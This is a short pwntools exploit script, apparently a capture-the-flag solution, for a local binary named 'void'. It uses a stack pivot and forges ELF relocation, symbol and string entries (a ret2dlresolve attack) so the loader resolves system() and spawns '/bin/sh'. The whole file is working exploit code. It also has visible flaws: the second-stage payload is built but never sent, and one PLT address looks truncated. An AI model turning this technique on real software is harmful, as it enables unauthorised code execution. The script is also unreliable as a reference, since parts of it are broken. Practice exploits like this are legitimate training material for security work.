from pwn import *

context.arch = "amd64"
context.log_level = "DEBUG"

p = process('./void')

def align(addr):
    return (0x18 - (addr) % 0x18)

# Sections
# RWAREA = .data + N, N >= 0x700, to avoid segfault

RW_AREA = 0x404000 + 0x700
PLT = 0x40102 # .plt default stub
JMPREL = 0x400430 # .rela.plt section
SYMTAB = 0x400330 # .symtab section
STRTAB = 0x400390 # .strtab section

# Gadgets
pop_rdi = 0x4011bb
pop_rsi_r15 = 0x4011b9
leave_ret = 0x401141

plt_read = 0x401030
got_read = 0x404018

# Fake .rela.plt
fake_relaplt = RW_AREA + 0x20 # Right after reloc_arg
fake_relaplt += align(fake_relaplt - JMPREL) # Alignment in x64 is 0x18
reloc_arg = (fake_relaplt - JMPREL) // 0x18

# Fake .symtab
fake_symtab = fake_relaplt + 0x18
fake_symtab += align(fake_symtab - SYMTAB) # Alignment in x64 is 0x18
r_info = (((fake_symtab - SYMTAB) // 0x18) << 32) | 0x7 # | 0x7 to bypass check 4

# Fake .strtab
fake_symstr = fake_symtab + 0x18
st_name = fake_symstr - STRTAB
bin_sh = fake_symstr + 0x8

# STAGE 1:
# A second call to read() stores the fake structures on the RW_AREA
# Then, we jump on RW_AREA using stack pivoting

stage1 = b"A" * 72
stage1 += p64(RW_AREA) # We will pivot here using the keave_ret gadget
stage1 += p64(pop_rdi) + p64(0)
stage1 += p64(pop_rsi_r15) + p64(RW_AREA + 0x8) + p64(0)
stage1 += p64(plt_read)
stage1 += p64(leave_ret)
stage1 += b"X" * (0x90 - len(stage1))

# STAGE 2:
# We send the payload containing the fake structures
stage2 = p64(pop_rdi) + p64(bin_sh)
stage2 += p64(PLT)
stage2 += p64(reloc_arg)

# Fake Elf64_Rel
stage2 += p64(got_read) # r_offset
stage2 += p64(r_info)   # r_info

# Align
stage2 += p64(0) * 3

# Fake Elf64_Sym
stage2 += p32(st_name)
stage2 += p8(0x12) # st_info
stage2 += p8(0) # st_other -> 0x00, bypass check .5
stage2 += p16(0) # st_shndx
stage2 += p64(0) # st_value
stage2 += p64(0) # st_size

# Fake strings
stage2 += b"system\x00\x00"
stage2 += b"/bin/sh\x00"
stage2 += b"X" * (0x90 - len(stage2))

p.sendline(stage1)
p.interactive()